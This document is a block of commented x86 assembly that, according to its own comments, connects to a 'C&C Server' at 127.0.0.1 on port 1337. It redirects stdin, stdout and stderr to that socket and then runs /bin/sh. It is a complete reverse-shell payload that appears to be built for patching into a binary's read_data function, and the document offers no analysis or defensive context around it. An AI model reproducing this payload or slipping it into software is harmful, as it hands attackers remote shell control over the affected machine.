// Connect to C&C Server on localhost aka 127.0.0.1 and on port 1337
sub    esp,0x4
push   0x0
push   0x1
push   0x2
mov edx, 0x08048730
call   edx # <socket@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x10],eax
mov    DWORD PTR [ebp-0x24],0x0
mov    DWORD PTR [ebp-0x20],0x0
mov    DWORD PTR [ebp-0x1c],0x0
mov    DWORD PTR [ebp-0x18],0x0
mov    WORD PTR [ebp-0x24],0x2
sub    esp,0xc
lea    eax,[ebx-0x1ff8]
push   eax
mov edx, 0x08048740
call   edx # <inet_addr@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x20],eax
sub    esp,0xc
push   0x539
mov edx, 0x08048640
call  edx # <htons@plt>
add    esp,0x10
mov    WORD PTR [ebp-0x22],ax
sub    esp,0x4
push   0x10
lea    eax,[ebp-0x24]
push   eax
push   DWORD PTR [ebp-0x10]
mov edx, 0x08048750
call   edx # <connect@plt>
add    esp,0x10
test   eax,eax
je     0x1e # to 0x8049ef <read_data+0xe6>
sub    esp,0xc
lea    eax,[ebx-0x1fec]
push   eax
mov edx, 0x08048650
call   edx # <perror@plt>
add    esp,0x10
sub    esp,0xc
push   0x0
mov edx, 0x80490e0
call edx # <exit@plt>
// Redirect STDIN to the socket
sub    esp,0x8
push   0x0
push   DWORD PTR [ebp-0x10]
mov edx, 0x8048600
call   edx  # <dup2@plt>
add    esp,0x10
cmp    eax,0xffffffff
jne    0x1E # t0 0x8049420 <read_data+0x117>
sub    esp,0xc
lea    eax,[ebx-0x1fc8]
push   eax
mov edx, 0x08048650
call   edx # <perror@plt>
add    esp,0x10
sub    esp,0xc
push   0x0
mov edx, 0x80490e0
call   edx # <exit@plt>
// Redirect STDOUT to the socket
sub    esp,0x8
push   0x1
push   DWORD PTR [ebp-0x10]
mov edx, 0x8048600
call   edx # <dup2@plt>
add    esp,0x10
cmp    eax,0xffffffff
mov ebx, 0x8049451
jne    0x1D # 0x8049451 <read_data+0x148>
sub    esp,0xc
lea    eax,[ebx-0x1fa4]
push   eax
mov edx, 0x08048650
call   edx # <perror@plt>
add    esp,0x10
sub    esp,0xc
push   0x0
mov edx, 0x80490e0
call   edx # <exit@plt>
// Redirect STDERR to the socket
sub    esp,0x8
push   0x2
push   DWORD PTR [ebp-0x10]
mov edx, 0x8048600
call   edx # <dup2@plt>
add    esp,0x10
cmp    eax,0xffffffff
jne    0x1D # to 0x8049482 <read_data+0x179>
sub    esp,0xc
lea    eax,[ebx-0x1f7c]
push   eax
mov edx, 0x08048650
call   edx # <perror@plt>
add    esp,0x10
sub    esp,0xc
push   0x0
mov edx, 0x80490e0
call   edx # <exit@plt>
// Execute /bin/sh
sub    esp,0x8
push   0x0
lea    eax,[ebx-0x1f57]
push   eax
mov edx, 0x8049110
call   edx # <execv@plt>
add    esp,0x10
